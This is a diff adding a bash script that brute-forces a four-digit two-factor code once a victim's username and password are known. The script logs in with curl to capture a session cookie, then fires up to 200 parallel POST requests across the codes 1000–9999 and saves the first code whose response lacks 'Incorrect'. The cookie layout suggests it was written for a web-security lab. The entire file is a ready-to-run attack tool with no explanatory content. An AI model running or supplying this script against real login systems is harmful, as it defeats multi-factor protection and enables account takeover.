@@ -1,0 +1,51 @@
+#!/usr/bin/bash
+
+# Brute-force 2FA code, with correct credentials
+# Valid code found via "cat valid_code"
+
+username=$1
+password=$2
+url=$3
+threads=200 # Sets as needed
+
+
+find . -name "*_response" -exec rm {} \; # Remove Unecessary files if exist
+
+send_code() { # The launcher function
+	curl -s -o $5  -X POST -b "verify=$1" -b "session=$4" -d "mfa-code=$6" $3
+}
+
+get_session() {
+	curl -s -i -X POST -d "username=$1&password=$2" $3 | grep "session" | cut -d "=" -f 2 | cut -d ";" -f 1 > session
+}
+
+running_jobs() {
+	jobs -rp | wc -l
+}
+
+execute() {
+	send_code "$1" "$2" "$3" "$4" "$5_response" "$5" &&
+	if ! cat $5_response | grep "Incorrect"; then # For disable output use: "grep -q "Incorrect"
+		echo "[!] Found code: $5"
+		echo "$5" > valid_code
+
+	else
+		echo "$5 Not valid" # Comment the line to hide output
+		rm $5_response
+	fi
+}
+
+url_code="$url"2 # URL for 2FA page
+get_session "$username" "$password" "$url" # Set session cookies to session file
+session=$(cat session)
+for i in $(seq 1000 9999); do
+	echo "i: $i"
+	while [ "$(running_jobs)" -gt "$threads" ]; do # Threading limits
+		sleep 0.1
+	done
+	execute "$username" "$password" "$url_code" "$session" "$i" &
+	[ -f valid_code ] && break # End process if code found
+done
+
+rm session
+exit 0
